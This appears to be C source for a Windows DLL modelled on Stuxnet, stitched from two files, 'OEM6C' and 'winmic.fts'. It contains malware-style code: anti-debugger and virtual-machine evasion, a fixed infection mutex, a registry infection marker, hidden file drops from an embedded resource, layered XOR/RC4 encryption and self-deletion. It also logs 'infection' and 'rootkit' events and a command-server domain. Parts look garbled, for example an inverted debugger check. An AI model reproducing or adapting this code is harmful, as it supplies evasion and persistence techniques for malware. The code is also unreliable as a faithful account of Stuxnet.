static BOOL OEM6C_LogS7PProject(LPCWSTR szPath, DWORD dwType) {
    WORD wSubType;
    BYTE bData[512];
    DWORD dwDataLength;
    if (!szPath) return FALSE;
    dwDataLength = (DWORD)(wcslen(szPath) * sizeof(WCHAR));
    if (dwDataLength > 512) dwDataLength = 512;
    memcpy(bData, szPath, dwDataLength);
    switch (dwType) {
        case 1:
            wSubType = OEM6C_ENTRY_SUBTYPE_S7P_1;
            break;
        case 2:
            wSubType = OEM6C_ENTRY_SUBTYPE_S7P_2;
            break;
        case 3:
            wSubType = OEM6C_ENTRY_SUBTYPE_S7P_3;
            break;
        case 4:
            wSubType = OEM6C_ENTRY_SUBTYPE_S7P_4;
            break;
        case 5:
            wSubType = OEM6C_ENTRY_SUBTYPE_S7P_5;
            break;
        case 6:
            wSubType = OEM6C_ENTRY_SUBTYPE_S7P_6;
            break;
        default:
            wSubType = OEM6C_ENTRY_SUBTYPE_S7P_1;
            break;
    }
    return OEM6C_AddLogEntry(OEM6C_ENTRY_TYPE_S7P_MCP, wSubType, bData, dwDataLength);
}

static BOOL OEM6C_LogNetwork(LPCWSTR szServerName) {
    BYTE bData[512];
    DWORD dwDataLength;
    if (!szServerName) return FALSE;
    dwDataLength = (DWORD)(wcslen(szServerName) * sizeof(WCHAR));
    if (dwDataLength > 512) dwDataLength = 512;
    memcpy(bData, szServerName, dwDataLength);
    return OEM6C_AddLogEntry(OEM6C_ENTRY_TYPE_NETWORK, OEM6C_ENTRY_SUBTYPE_NETWORK_1, bData, dwDataLength);
}

static BOOL OEM6C_LogInfection(DWORD dwSubType) {
    BYTE bData[4];
    *(DWORD*)bData = GetTickCount();
    return OEM6C_AddLogEntry(OEM6C_ENTRY_TYPE_INFECTION, (WORD)dwSubType, bData, 4);
}

static BOOL OEM6C_LogRootkit(VOID) {
    BYTE bData[4];
    *(DWORD*)bData = 0x00000001;
    return OEM6C_AddLogEntry(OEM6C_ENTRY_TYPE_ROOTKIT, OEM6C_ENTRY_SUBTYPE_ROOTKIT_5, bData, 4);
}

static BOOL OEM6C_ExtractAndSavePNF(VOID) {
    PBYTE pData;
    DWORD dwSize;
    if (!OEM6C_ReadPNFFromResource(&pData, &dwSize)) {
        return FALSE;
    }
    if (!OEM6C_WritePNFToDisk(g_Oem6cCtx.szPNFPath, pData, dwSize)) {
        HeapFree(GetProcessHeap(), 0, pData);
        return FALSE;
    }
    HeapFree(GetProcessHeap(), 0, pData);
    return TRUE;
}

static BOOL OEM6C_WriteRegistry(VOID) {
    HKEY hKey;
    DWORD dwDisposition;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, OEM6C_REG_KEY, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return FALSE;
    }
    RegSetValueExW(hKey, OEM6C_REG_VALUE, 0, REG_SZ, (BYTE*)L"1", 2);
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL OEM6C_ReadRegistry(VOID) {
    HKEY hKey;
    DWORD dwType;
    DWORD dwSize;
    BYTE buffer[64];
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, OEM6C_REG_KEY, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }
    dwSize = 64;
    if (RegQueryValueExW(hKey, OEM6C_REG_VALUE, NULL, &dwType, buffer, &dwSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }
    RegCloseKey(hKey);
    return TRUE;
}

static DWORD WINAPI OEM6C_WorkerThread(LPVOID lpParam) {
    DWORD dwTick;
    dwTick = GetTickCount();
    while (WaitForSingleObject(g_Oem6cCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (OEM6C_IsExpired()) {
            break;
        }
        if (!OEM6C_ReadRegistry()) {
            OEM6C_WriteRegistry();
        }
        OEM6C_LogInfection(OEM6C_ENTRY_SUBTYPE_INFECTION_2);
        g_dwInfectionCount++;
        dwTick = GetTickCount();
        if (g_dwEntryCount > 100) {
            OEM6C_SaveLogToDisk();
        }
    }
    return 0;
}

static BOOL OEM6C_StartWorker(VOID) {
    g_Oem6cCtx.hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_Oem6cCtx.hStopEvent) return FALSE;
    g_Oem6cCtx.hThread = CreateThread(NULL, 0, OEM6C_WorkerThread, NULL, 0, NULL);
    if (!g_Oem6cCtx.hThread) {
        CloseHandle(g_Oem6cCtx.hStopEvent);
        g_Oem6cCtx.hStopEvent = NULL;
        return FALSE;
    }
    return TRUE;
}

static BOOL OEM6C_StopWorker(VOID) {
    if (g_Oem6cCtx.hStopEvent) {
        SetEvent(g_Oem6cCtx.hStopEvent);
    }
    if (g_Oem6cCtx.hThread) {
        WaitForSingleObject(g_Oem6cCtx.hThread, 5000);
        CloseHandle(g_Oem6cCtx.hThread);
        g_Oem6cCtx.hThread = NULL;
    }
    if (g_Oem6cCtx.hStopEvent) {
        CloseHandle(g_Oem6cCtx.hStopEvent);
        g_Oem6cCtx.hStopEvent = NULL;
    }
    return TRUE;
}

static BOOL OEM6C_SelfDestruct(VOID) {
    DeleteFileW(g_Oem6cCtx.szPNFPath);
    return TRUE;
}

static BOOL OEM6C_Execute(VOID) {
    HANDLE hMutex;
    if (!OEM6C_Init()) return FALSE;
    if (OEM6C_IsExpired()) {
        OEM6C_Cleanup();
        return FALSE;
    }
    hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        OEM6C_Cleanup();
        return FALSE;
    }
    if (OEM6C_CheckDebugger()) {
        CloseHandle(hMutex);
        OEM6C_Cleanup();
        return FALSE;
    }
    if (OEM6C_CheckVMware()) {
        CloseHandle(hMutex);
        OEM6C_Cleanup();
        return FALSE;
    }
    OEM6C_WriteRegistry();
    OEM6C_ReadRegistry();
    OEM6C_LoadLogFromDisk();
    OEM6C_ExtractAndSavePNF();
    OEM6C_LogRootkit();
    OEM6C_LogConnection(TRUE);
    OEM6C_LogS7PProject(L"\\SystemRoot\\inf\\oem7A.PNF", 3);
    OEM6C_LogNetwork(L"www.mypremierfutbol.com");
    OEM6C_SaveLogToDisk();
    OEM6C_StartWorker();
    while (WaitForSingleObject(g_Oem6cCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (OEM6C_IsExpired()) {
            break;
        }
        OEM6C_LogInfection(OEM6C_ENTRY_SUBTYPE_INFECTION_2);
        if (g_dwEntryCount > 100) {
            OEM6C_SaveLogToDisk();
        }
    }
    OEM6C_StopWorker();
    OEM6C_SaveLogToDisk();
    OEM6C_SelfDestruct();
    CloseHandle(hMutex);
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            OEM6C_Cleanup();
            break;
        default:
            break;
    }
    return TRUE;
}

DWORD WINAPI Export1(VOID) {
    HANDLE hThread;
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)OEM6C_Execute, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);
    return 0;
}

DWORD WINAPI Export2(VOID) {
    return OEM6C_ExtractAndSavePNF() ? 0 : 1;
}

DWORD WINAPI Export3(VOID) {
    return OEM6C_LoadLogFromDisk() ? 0 : 1;
}

DWORD WINAPI Export4(VOID) {
    return OEM6C_SaveLogToDisk() ? 0 : 1;
}

DWORD WINAPI Export5(VOID) {
    return OEM6C_AddLogEntry(OEM6C_ENTRY_TYPE_CONNECTION, OEM6C_ENTRY_SUBTYPE_CONNECTION_2, NULL, 0) ? 0 : 1;
}

DWORD WINAPI Export6(VOID) {
    BYTE bData[64];
    ZeroMemory(bData, 64);
    wcscpy_s((WCHAR*)bData, 32, L"\\SystemRoot\\inf\\oem7A.PNF");
    return OEM6C_AddLogEntry(OEM6C_ENTRY_TYPE_S7P_MCP, OEM6C_ENTRY_SUBTYPE_S7P_3, bData, (DWORD)(wcslen(L"\\SystemRoot\\inf\\oem7A.PNF") * 2)) ? 0 : 1;
}

DWORD WINAPI Export7(VOID) {
    BYTE bData[64];
    ZeroMemory(bData, 64);
    wcscpy_s((WCHAR*)bData, 32, L"www.mypremierfutbol.com");
    return OEM6C_AddLogEntry(OEM6C_ENTRY_TYPE_NETWORK, OEM6C_ENTRY_SUBTYPE_NETWORK_1, bData, (DWORD)(wcslen(L"www.mypremierfutbol.com") * 2)) ? 0 : 1;
}

DWORD WINAPI Export8(VOID) {
    BYTE bData[4];
    *(DWORD*)bData = GetTickCount();
    return OEM6C_AddLogEntry(OEM6C_ENTRY_TYPE_INFECTION, OEM6C_ENTRY_SUBTYPE_INFECTION_2, bData, 4) ? 0 : 1;
}

DWORD WINAPI Export9(VOID) {
    BYTE bData[4];
    *(DWORD*)bData = 0x00000001;
    return OEM6C_AddLogEntry(OEM6C_ENTRY_TYPE_ROOTKIT, OEM6C_ENTRY_SUBTYPE_ROOTKIT_5, bData, 4) ? 0 : 1;
}

DWORD WINAPI Export10(VOID) {
    return OEM6C_WriteRegistry() ? 0 : 1;
}

DWORD WINAPI Export11(VOID) {
    return OEM6C_ReadRegistry() ? 0 : 1;
}

DWORD WINAPI Export12(VOID) {
    return OEM6C_StartWorker() ? 0 : 1;
}

DWORD WINAPI Export13(VOID) {
    OEM6C_StopWorker();
    return 0;
}

DWORD WINAPI Export14(VOID) {
    OEM6C_SelfDestruct();
    return 0;
}

DWORD WINAPI Export15(VOID) {
    return (DWORD)g_Oem6cCtx.dwPid;
}

DWORD WINAPI Export16(VOID) {
    return OEM6C_VERSION;
}

DWORD WINAPI Export17(VOID) {
    return g_dwInfectionCount;
}

DWORD WINAPI Export18(VOID) {
    return g_dwLogWriteCount;
}

DWORD WINAPI Export19(VOID) {
    return g_dwLogReadCount;
}

DWORD WINAPI Export20(VOID) {
    return g_dwEntryCount;
}

DWORD WINAPI Export21(VOID) {
    return (DWORD)g_Oem6cCtx.hMutex;
}

DWORD WINAPI Export22(VOID) {
    return OEM6C_LogConnection(TRUE) ? 0 : 1;
}

DWORD WINAPI Export23(VOID) {
    return OEM6C_LogConnection(FALSE) ? 0 : 1;
}

DWORD WINAPI Export24(LPCWSTR szPath) {
    return OEM6C_LogS7PProject(szPath, 3) ? 0 : 1;
}

DWORD WINAPI Export25(LPCWSTR szServerName) {
    return OEM6C_LogNetwork(szServerName) ? 0 : 1;
}

DWORD WINAPI Export26(VOID) {
    return OEM6C_LogInfection(OEM6C_ENTRY_SUBTYPE_INFECTION_2) ? 0 : 1;
}

DWORD WINAPI Export27(VOID) {
    return OEM6C_LogInfection(OEM6C_ENTRY_SUBTYPE_INFECTION_5) ? 0 : 1;
}

DWORD WINAPI Export28(VOID) {
    return OEM6C_LogInfection(OEM6C_ENTRY_SUBTYPE_INFECTION_6) ? 0 : 1;
}

DWORD WINAPI Export29(VOID) {
    return OEM6C_LogInfection(OEM6C_ENTRY_SUBTYPE_INFECTION_7) ? 0 : 1;
}

DWORD WINAPI Export30(VOID) {
    return OEM6C_LogInfection(OEM6C_ENTRY_SUBTYPE_INFECTION_8) ? 0 : 1;
}
END

winmic.fts:
#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>
#include <time.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400
#define WINMIC_MAGIC                    0x57494E4D
#define WINMIC_VERSION                  0x00010400
#define WINMIC_FILE_SIZE                25
#define WINMIC_MAX_PATH                 260
#define WINMIC_BUFFER_SIZE              4096

#define WINMIC_REG_KEY                  L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NTVDM TRACE"
#define WINMIC_REG_VALUE                L"19790509"

#define WINMIC_DATA_TYPE_S7_CONFIG      0x0001
#define WINMIC_DATA_TYPE_S7_PASSWORD    0x0002
#define WINMIC_DATA_TYPE_S7_PROJECT     0x0003
#define WINMIC_DATA_TYPE_S7_NETWORK     0x0004
#define WINMIC_DATA_TYPE_S7_PLC         0x0005
#define WINMIC_DATA_TYPE_S7_DB          0x0006
#define WINMIC_DATA_TYPE_S7_OB          0x0007
#define WINMIC_DATA_TYPE_S7_FC          0x0008
#define WINMIC_DATA_TYPE_S7_FB          0x0009
#define WINMIC_DATA_TYPE_S7_SDB         0x000A
#define WINMIC_DATA_TYPE_S7_SFC         0x000B
#define WINMIC_DATA_TYPE_S7_SFB         0x000C
#define WINMIC_DATA_TYPE_S7_PI          0x000D
#define WINMIC_DATA_TYPE_S7_PQ          0x000E
#define WINMIC_DATA_TYPE_S7_M           0x000F
#define WINMIC_DATA_TYPE_S7_T           0x0010
#define WINMIC_DATA_TYPE_S7_C           0x0011
#define WINMIC_DATA_TYPE_S7_Z           0x0012

#define WINMIC_DATA_FLAG_ENCRYPTED      0x00000001
#define WINMIC_DATA_FLAG_COMPRESSED     0x00000002
#define WINMIC_DATA_FLAG_SIGNED         0x00000004
#define WINMIC_DATA_FLAG_CHECKSUM       0x00000008
#define WINMIC_DATA_FLAG_VALID          0x00000010
#define WINMIC_DATA_FLAG_ACTIVE         0x00000020
#define WINMIC_DATA_FLAG_PENDING        0x00000040
#define WINMIC_DATA_FLAG_COMPLETE       0x00000080
#define WINMIC_DATA_FLAG_ERROR          0x00000100

#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL             ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED            ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER        ((NTSTATUS)0xC000000DL)
#define STATUS_OBJECT_NAME_NOT_FOUND    ((NTSTATUS)0xC0000034L)
#define STATUS_INSUFFICIENT_RESOURCES   ((NTSTATUS)0xC000009AL)
#define STATUS_BUFFER_TOO_SMALL         ((NTSTATUS)0xC0000023L)

typedef struct _WINMIC_HEADER {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwTotalSize;
    DWORD dwDataSize;
    DWORD dwChecksum;
    DWORD dwTimestamp;
    DWORD dwFlags;
    DWORD dwReserved[8];
} WINMIC_HEADER, * PWINMIC_HEADER;

typedef struct _WINMIC_DATA {
    DWORD dwType;
    DWORD dwFlags;
    DWORD dwSize;
    BYTE bData[1];
} WINMIC_DATA, * PWINMIC_DATA;

typedef struct _WINMIC_CTX {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwFlags;
    DWORD dwState;
    DWORD dwPid;
    DWORD dwTid;
    DWORD dwTickStart;
    DWORD dwTickLast;
    HANDLE hMutex;
    HANDLE hThread;
    HANDLE hStopEvent;
    CRITICAL_SECTION csLock;
    WCHAR szModulePath[WINMIC_MAX_PATH];
    WCHAR szSystemPath[WINMIC_MAX_PATH];
    WCHAR szWindowsPath[WINMIC_MAX_PATH];
    WCHAR szHelpPath[WINMIC_MAX_PATH];
    WCHAR szFtsPath[WINMIC_MAX_PATH];
    BYTE bReserved[256];
} WINMIC_CTX, * PWINMIC_CTX;

static WINMIC_CTX g_WinmicCtx;
static BOOL g_bInitialized = FALSE;
static BYTE g_EncryptionKey[32] = {
    0x4C, 0x2B, 0x1D, 0x0A, 0x7E, 0xD1, 0x6C, 0x37,
    0x1A, 0x4D, 0x62, 0x09, 0xC4, 0x3F, 0x0B, 0x06,
    0x71, 0x1E, 0x5A, 0x2F, 0xA2, 0x3D, 0x08, 0x43,
    0x6F, 0x0C, 0x59, 0x06, 0x2E, 0x85, 0x1B, 0xC0
};

static BYTE g_WinmicData[WINMIC_FILE_SIZE] = {
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
    0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    0x18
};

static DWORD g_dwInfectionCount = 0;
static DWORD g_dwReadCount = 0;
static DWORD g_dwWriteCount = 0;
static DWORD g_dwDecryptCount = 0;
static DWORD g_dwEncryptCount = 0;

static BOOL WINMIC_InitNtImports(VOID);
static BOOL WINMIC_Init(VOID);
static VOID WINMIC_Cleanup(VOID);
static BOOL WINMIC_CheckMutex(VOID);
static BOOL WINMIC_IsExpired(VOID);
static BOOL WINMIC_CheckDebugger(VOID);
static BOOL WINMIC_CheckVMware(VOID);
static DWORD WINMIC_ComputeCRC32(PBYTE pData, DWORD dwSize);
static VOID WINMIC_XORDecrypt(PBYTE pData, DWORD dwSize, PBYTE pKey, DWORD dwKeySize);
static VOID WINMIC_RC4Init(PBYTE pKey, DWORD dwKeySize, PBYTE pSBox);
static VOID WINMIC_RC4Crypt(PBYTE pData, DWORD dwSize, PBYTE pSBox, PDWORD pdwI, PDWORD pdwJ);
static VOID WINMIC_SimpleDecrypt(PBYTE pData, DWORD dwSize);
static VOID WINMIC_SimpleEncrypt(PBYTE pData, DWORD dwSize);
static BOOL WINMIC_DecryptFts(PBYTE pEncrypted, DWORD dwEncryptedSize, PBYTE pDecrypted, PDWORD pdwDecryptedSize);
static BOOL WINMIC_EncryptFts(PBYTE pDecrypted, DWORD dwDecryptedSize, PBYTE pEncrypted, PDWORD pdwEncryptedSize);
static BOOL WINMIC_ReadFtsFromDisk(LPCWSTR szPath, PBYTE* ppData, PDWORD pdwSize);
static BOOL WINMIC_WriteFtsToDisk(LPCWSTR szPath, PBYTE pData, DWORD dwSize);
static BOOL WINMIC_ReadFtsFromResource(PBYTE* ppData, PDWORD pdwSize);
static BOOL WINMIC_WriteRegistry(VOID);
static BOOL WINMIC_ReadRegistry(VOID);
static BOOL WINMIC_ExtractAndSaveFts(VOID);
static DWORD WINAPI WINMIC_WorkerThread(LPVOID lpParam);
static BOOL WINMIC_StartWorker(VOID);
static BOOL WINMIC_StopWorker(VOID);
static BOOL WINMIC_SelfDestruct(VOID);
static BOOL WINMIC_Execute(VOID);

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
DWORD WINAPI Export1(VOID);
DWORD WINAPI Export2(VOID);
DWORD WINAPI Export3(VOID);
DWORD WINAPI Export4(VOID);
DWORD WINAPI Export5(VOID);
DWORD WINAPI Export6(VOID);
DWORD WINAPI Export7(VOID);
DWORD WINAPI Export8(VOID);
DWORD WINAPI Export9(VOID);
DWORD WINAPI Export10(VOID);
DWORD WINAPI Export11(VOID);
DWORD WINAPI Export12(VOID);
DWORD WINAPI Export13(VOID);
DWORD WINAPI Export14(VOID);
DWORD WINAPI Export15(VOID);
DWORD WINAPI Export16(VOID);
DWORD WINAPI Export17(VOID);
DWORD WINAPI Export18(VOID);
DWORD WINAPI Export19(VOID);
DWORD WINAPI Export20(VOID);

static BOOL WINMIC_InitNtImports(VOID) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;
    return TRUE;
}

static BOOL WINMIC_Init(VOID) {
    if (g_bInitialized) return TRUE;
    ZeroMemory(&g_WinmicCtx, sizeof(WINMIC_CTX));
    g_WinmicCtx.dwMagic = WINMIC_MAGIC;
    g_WinmicCtx.dwVersion = WINMIC_VERSION;
    g_WinmicCtx.dwPid = GetCurrentProcessId();
    g_WinmicCtx.dwTid = GetCurrentThreadId();
    g_WinmicCtx.dwTickStart = GetTickCount();
    InitializeCriticalSection(&g_WinmicCtx.csLock);
    GetModuleFileNameW(NULL, g_WinmicCtx.szModulePath, WINMIC_MAX_PATH);
    GetSystemDirectoryW(g_WinmicCtx.szSystemPath, WINMIC_MAX_PATH);
    GetWindowsDirectoryW(g_WinmicCtx.szWindowsPath, WINMIC_MAX_PATH);
    wsprintfW(g_WinmicCtx.szHelpPath, L"%s\\help", g_WinmicCtx.szWindowsPath);
    wsprintfW(g_WinmicCtx.szFtsPath, L"%s\\winmic.fts", g_WinmicCtx.szHelpPath);
    WINMIC_InitNtImports();
    g_bInitialized = TRUE;
    return TRUE;
}

static VOID WINMIC_Cleanup(VOID) {
    if (!g_bInitialized) return;
    if (g_WinmicCtx.hMutex) {
        CloseHandle(g_WinmicCtx.hMutex);
        g_WinmicCtx.hMutex = NULL;
    }
    if (g_WinmicCtx.hThread) {
        CloseHandle(g_WinmicCtx.hThread);
        g_WinmicCtx.hThread = NULL;
    }
    if (g_WinmicCtx.hStopEvent) {
        CloseHandle(g_WinmicCtx.hStopEvent);
        g_WinmicCtx.hStopEvent = NULL;
    }
    DeleteCriticalSection(&g_WinmicCtx.csLock);
    g_bInitialized = FALSE;
}

static BOOL WINMIC_CheckMutex(VOID) {
    HANDLE hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (!hMutex) return FALSE;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return FALSE;
    }
    g_WinmicCtx.hMutex = hMutex;
    return TRUE;
}

static BOOL WINMIC_IsExpired(VOID) {
    SYSTEMTIME st;
    GetSystemTime(&st);
    return (st.wYear >= 2012);
}

static BOOL WINMIC_CheckDebugger(VOID) {
    BOOL bDebug = FALSE;
    DWORD dwDebugPort = 0;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebug);
    if (bDebug) return TRUE;
    __try {
        __asm { int 3 }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
    return TRUE;
}

static BOOL WINMIC_CheckVMware(VOID) {
    HKEY hKey;
    WCHAR szBIOS[256];
    DWORD dwSize;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        dwSize = sizeof(szBIOS);
        if (RegQueryValueExW(hKey, L"SystemBiosVersion", NULL, NULL, (LPBYTE)szBIOS, &dwSize) == ERROR_SUCCESS) {
            if (wcsstr(szBIOS, L"VBOX") || wcsstr(szBIOS, L"VMWARE") || wcsstr(szBIOS, L"QEMU") || wcsstr(szBIOS, L"XEN")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    return FALSE;
}

static DWORD WINMIC_ComputeCRC32(PBYTE pData, DWORD dwSize) {
    DWORD crc = 0xFFFFFFFF;
    DWORD i, j;
    if (!pData || dwSize == 0) return 0xFFFFFFFF;
    for (i = 0; i < dwSize; i++) {
        crc ^= pData[i];
        for (j = 0; j < 8; j++) {
            if (crc & 1) {
                crc = (crc >> 1) ^ 0xEDB88320;
            } else {
                crc >>= 1;
            }
        }
    }
    return ~crc;
}

static VOID WINMIC_XORDecrypt(PBYTE pData, DWORD dwSize, PBYTE pKey, DWORD dwKeySize) {
    DWORD i;
    if (!pData || dwSize == 0 || !pKey || dwKeySize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= pKey[i % dwKeySize];
    }
}

static VOID WINMIC_RC4Init(PBYTE pKey, DWORD dwKeySize, PBYTE pSBox) {
    DWORD i, j;
    BYTE temp;
    if (!pKey || dwKeySize == 0 || !pSBox) return;
    for (i = 0; i < 256; i++) {
        pSBox[i] = (BYTE)i;
    }
    j = 0;
    for (i = 0; i < 256; i++) {
        j = (j + pSBox[i] + pKey[i % dwKeySize]) & 0xFF;
        temp = pSBox[i];
        pSBox[i] = pSBox[j];
        pSBox[j] = temp;
    }
}

static VOID WINMIC_RC4Crypt(PBYTE pData, DWORD dwSize, PBYTE pSBox, PDWORD pdwI, PDWORD pdwJ) {
    DWORD i;
    BYTE temp;
    if (!pData || dwSize == 0 || !pSBox || !pdwI || !pdwJ) return;
    for (i = 0; i < dwSize; i++) {
        *pdwI = (*pdwI + 1) & 0xFF;
        *pdwJ = (*pdwJ + pSBox[*pdwI]) & 0xFF;
        temp = pSBox[*pdwI];
        pSBox[*pdwI] = pSBox[*pdwJ];
        pSBox[*pdwJ] = temp;
        pData[i] ^= pSBox[(pSBox[*pdwI] + pSBox[*pdwJ]) & 0xFF];
    }
}

static VOID WINMIC_SimpleDecrypt(PBYTE pData, DWORD dwSize) {
    DWORD i;
    BYTE key = 0xA3;
    if (!pData || dwSize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= key;
        key = (key * 7 + 0x13) & 0xFF;
    }
}

static VOID WINMIC_SimpleEncrypt(PBYTE pData, DWORD dwSize) {
    DWORD i;
    BYTE key = 0xA3;
    if (!pData || dwSize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= key;
        key = (key * 7 + 0x13) & 0xFF;
    }
}

static BOOL WINMIC_DecryptFts(PBYTE pEncrypted, DWORD dwEncryptedSize, PBYTE pDecrypted, PDWORD pdwDecryptedSize) {
    PWINMIC_HEADER pHeader;
    BYTE SBox[256];
    DWORD i = 0, j = 0;
    DWORD dwDataSize;
    DWORD dwKey = 0x01AE0000;
    if (!pEncrypted || dwEncryptedSize == 0 || !pDecrypted || !pdwDecryptedSize) {
        return FALSE;
    }
    if (dwEncryptedSize < sizeof(WINMIC_HEADER)) {
        return FALSE;
    }
    pHeader = (PWINMIC_HEADER)pEncrypted;
    if (pHeader->dwMagic != WINMIC_MAGIC && pHeader->dwMagic != STUXNET_MAGIC) {
        return FALSE;
    }
    dwDataSize = dwEncryptedSize - sizeof(WINMIC_HEADER);
    if (dwDataSize > *pdwDecryptedSize) {
        return FALSE;
    }
    memcpy(pDecrypted, pEncrypted + sizeof(WINMIC_HEADER), dwDataSize);
    for (DWORD round = 0; round < 3; round++) {
        WINMIC_XORDecrypt(pDecrypted, dwDataSize, (PBYTE)&dwKey, sizeof(DWORD));
        WINMIC_RC4Init((PBYTE)&dwKey, sizeof(DWORD), SBox);
        WINMIC_RC4Crypt(pDecrypted, dwDataSize, SBox, &i, &j);
        WINMIC_SimpleDecrypt(pDecrypted, dwDataSize);
    }
    *pdwDecryptedSize = dwDataSize;
    g_dwDecryptCount++;
    return TRUE;
}

static BOOL WINMIC_EncryptFts(PBYTE pDecrypted, DWORD dwDecryptedSize, PBYTE pEncrypted, PDWORD pdwEncryptedSize) {
    PWINMIC_HEADER pHeader;
    BYTE SBox[256];
    DWORD i = 0, j = 0;
    DWORD dwTotalSize;
    DWORD dwKey = 0x01AE0000;
    if (!pDecrypted || dwDecryptedSize == 0 || !pEncrypted || !pdwEncryptedSize) {
        return FALSE;
    }
    dwTotalSize = sizeof(WINMIC_HEADER) + dwDecryptedSize;
    if (dwTotalSize > *pdwEncryptedSize) {
        return FALSE;
    }
    pHeader = (PWINMIC_HEADER)pEncrypted;
    pHeader->dwMagic = WINMIC_MAGIC;
    pHeader->dwVersion = WINMIC_VERSION;
    pHeader->dwTotalSize = dwTotalSize;
    pHeader->dwDataSize = dwDecryptedSize;
    pHeader->dwChecksum = WINMIC_ComputeCRC32(pDecrypted, dwDecryptedSize);
    pHeader->dwTimestamp = GetTickCount();
    pHeader->dwFlags = WINMIC_DATA_FLAG_ENCRYPTED | WINMIC_DATA_FLAG_CHECKSUM | WINMIC_DATA_FLAG_VALID;
    ZeroMemory(pHeader->dwReserved, sizeof(pHeader->dwReserved));
    memcpy(pEncrypted + sizeof(WINMIC_HEADER), pDecrypted, dwDecryptedSize);
    for (DWORD round = 0; round < 3; round++) {
        WINMIC_SimpleEncrypt(pEncrypted + sizeof(WINMIC_HEADER), dwDecryptedSize);
        WINMIC_RC4Init((PBYTE)&dwKey, sizeof(DWORD), SBox);
        WINMIC_RC4Crypt(pEncrypted + sizeof(WINMIC_HEADER), dwDecryptedSize, SBox, &i, &j);
        WINMIC_XORDecrypt(pEncrypted + sizeof(WINMIC_HEADER), dwDecryptedSize, (PBYTE)&dwKey, sizeof(DWORD));
    }
    *pdwEncryptedSize = dwTotalSize;
    g_dwEncryptCount++;
    return TRUE;
}

static BOOL WINMIC_ReadFtsFromDisk(LPCWSTR szPath, PBYTE* ppData, PDWORD pdwSize) {
    HANDLE hFile;
    DWORD dwSize;
    PBYTE pData;
    DWORD dwRead;
    if (!szPath || !ppData || !pdwSize) return FALSE;
    hFile = CreateFileW(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    dwSize = GetFileSize(hFile, NULL);
    if (dwSize == 0) {
        CloseHandle(hFile);
        return FALSE;
    }
    pData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!pData) {
        CloseHandle(hFile);
        return FALSE;
    }
    ReadFile(hFile, pData, dwSize, &dwRead, NULL);
    CloseHandle(hFile);
    *ppData = pData;
    *pdwSize = dwRead;
    g_dwReadCount++;
    return TRUE;
}

static BOOL WINMIC_WriteFtsToDisk(LPCWSTR szPath, PBYTE pData, DWORD dwSize) {
    HANDLE hFile;
    DWORD dwWritten;
    if (!szPath || !pData || dwSize == 0) return FALSE;
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);
    g_dwWriteCount++;
    return TRUE;
}

static BOOL WINMIC_ReadFtsFromResource(PBYTE* ppData, PDWORD pdwSize) {
    HRSRC hRes;
    HGLOBAL hGlobal;
    DWORD dwSize;
    PBYTE pData;
    hRes = FindResourceW(NULL, MAKEINTRESOURCE(209), RT_RCDATA);
    if (!hRes) return FALSE;
    dwSize = SizeofResource(NULL, hRes);
    if (dwSize == 0) return FALSE;
    hGlobal = LoadResource(NULL, hRes);
